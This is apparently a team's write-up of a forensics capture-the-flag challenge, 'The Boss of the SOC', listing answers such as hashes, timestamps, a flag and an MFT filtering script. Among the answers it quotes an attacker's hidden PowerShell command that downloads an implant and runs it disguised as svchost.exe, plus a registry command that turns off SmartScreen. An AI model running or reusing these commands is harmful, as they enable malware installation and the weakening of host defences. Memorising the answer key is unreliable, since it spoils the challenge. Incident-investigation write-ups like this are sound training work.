---
created: 2026-03-07T20:38
updated: 2026-03-11T04:22
points: 880
solves: 4
---

## The Boss of the SOC 1

### q1q2q3q4

My teammate found these

- `0EAE6B5A8897023DBFBA1021A6E1D090`
- `DESKTOP-0G20ROC`
- `2026-01-30 04:51:06`
- `192.168.1.139_2026-02-04 03:26:19`

### q5q6

I dumped the $MFT into a csv and used pandas to filter and sort the entries.

```python
start_date = pd.to_datetime("2026-01-01", utc=True) # were used first
end_date = pd.to_datetime("2026-03-01", utc=True)
sub = df[
    df["Filename"].str.contains(r"exe", case=False, na=False) &
    df["SI Creation Time"].between("2026-02-04 02:25:00", "2026-02-04 03:08:10")
].sort_values("SI Creation Time")
sub = sub[["Filename", "SI Creation Time"]]

print(sub.to_string())
```

At this point I knew that `greenshot.exe` was actually anydesk and exploit was in action, so I looked for when it was ran to pinpoint the time of the attack.

Then I located it to be between `2026-02-04 02:25:00` and `2026-02-04 03:08:10` (by vibes).

Then I just took all the timestamps, tried all of them by brute force, with $\pm10$ seconds, and got the answer for q5.

- `2026-02-04 02:28:37`

Afterwards I increased the margin to $\pm100$ seconds and got the answer for q6.

- `2026-02-04 02:27:30`

### q7

```sh
rg -uuai "http:" | grep -a -oE 'https?://[^/[:space:]]+' | sed -E 's|https?://||' | cut -d/ -f1 | sort -u > sus_domains.txt
```

I rgreped all domains appeared and unique'd them, I found `houssem0x1.me`, which had a snapshot on wayback machine, it has a button that copies the command to download the implant, which is the answer for q7. However for some reason it was wrong for me, until my teammate solved it with codex and it needed `r''`.

- `powershell -w hidden iwr http://192.168.1.137:1337/implant.exe -UseBasicParsing -O $env:temp\svchost.exe;start $env:temp\svchost.exe`

### q8q9q10q11q12q13

My teammate with codex was just too good, solved all of these in one go.

- `T1204.004`
- `whoami /priv`
- `REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer /v SmartScreenEnabled /t REG_SZ /d Off`
- `C:\Users\Public\Edge.exe`
- `1fe20f790c3bd09f4cf4f5b733377c34b35df4f0`
- `icacls.exe_takeown.exe`

## The Boss of the SOC 2

Well my teammate with codex just solved all of them again, they did get stuck for a very long time on part2 q8.

- `ATHACKCTF{FC9XIMHVKWL1KKO92L88VTP7TLFJH4WC}`
- `348362`
- `CalculatorUpdater`
- `bella_1234`
- `anydesk_greenshot.exe`
- `1671040367`
- `lol.lol`
- `4917072`
